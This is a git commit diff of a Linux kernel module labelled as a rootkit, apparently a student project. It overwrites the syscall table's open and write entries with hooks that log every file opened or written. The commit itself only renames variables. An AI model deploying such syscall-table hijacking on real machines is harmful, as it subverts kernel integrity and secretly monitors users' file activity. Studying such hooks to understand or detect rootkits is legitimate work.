8f5942e20996c2e3b037bf42b76aed7feee7f198
HiraiMomo-TWICE <caogiahung11A2@gmail.com>
2020-06-20 07:29:13 -0700

    update hookFunction.c

--- Project2/Rootkit/hookFunction.c
+++ Project2/Rootkit/hookFunction.c
@@ -17,17 +17,17 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Cao Gia Hung");
 
-void **system_call_table_addr;
+void **syscall_table_address;
 
-asmlinkage int (*original_open) (const char*, int, int);
-asmlinkage int (*original_write) (unsigned int, const char*, int);
+asmlinkage int (*system_open) (const char*, int, int);
+asmlinkage int (*system_write) (unsigned int, const char*, int);
 
 asmlinkage int hook_open (const char* file, int flags, int mode) {
-    char* buf = kmalloc(256, GFP_KERNEL);
-    copy_from_user(buf, file, 256);
-    printk(KERN_INFO "%s opened %s\n", current->comm, buf);
-    kfree(buf);
-    return original_open(file, flags, mode);
+    char* buffer = kmalloc(256, GFP_KERNEL);
+    copy_from_user(buffer, file, 256);
+    printk(KERN_INFO "%s opened %s\n", current->comm, buffer);
+    kfree(buffer);
+    return system_open(file, flags, mode);
 }
 
 asmlinkage int hook_write (unsigned int fd, const char* buf, int count) {
@@ -35,7 +35,7 @@ asmlinkage int hook_write (unsigned int fd, const char* buf, int count) {
     char* cwd = d_path(&files_fdtable(current->files)->fd[fd]->f_path, fileName, 256);
     printk(KERN_INFO "%s wrote %d byte(s) in %s", current->comm, count, cwd);
     kfree(fileName);
-    return original_write(fd, buf, count);
+    return system_write(fd, buf, count);
 }
 
 int make_rw(unsigned long address){
@@ -56,23 +56,23 @@ int make_ro(unsigned long address){
 
 static int __init entry_point(void){
     printk(KERN_INFO "Successfully Hook!...\n ");
-    system_call_table_addr = (void*)0xffffffff81a001c0;
+    syscall_table_address = (void*)0xffffffff81a001c0;
 
-    make_rw((unsigned long)system_call_table_addr);
+    make_rw((unsigned long)syscall_table_address);
 
-    original_open = system_call_table_addr[__NR_open];
-    system_call_table_addr[__NR_open] = hook_open;
+    system_open = syscall_table_address[__NR_open];
+    syscall_table_address[__NR_open] = hook_open;
     
-    original_write = system_call_table_addr[__NR_write];
-    system_call_table_addr[__NR_write] = hook_write;
+    system_write = syscall_table_address[__NR_write];
+    syscall_table_address[__NR_write] = hook_write;
 
     return 0;
 }
 
 static int __exit exit_point(void){
-    system_call_table_addr[__NR_open] = original_open;
-    system_call_table_addr[__NR_write] = original_write;
-    make_ro((unsigned long)system_call_table_addr);
+    syscall_table_address[__NR_open] = system_open;
+    syscall_table_address[__NR_write] = system_write;
+    make_ro((unsigned long)syscall_table_address);
     return 0;
 }
 
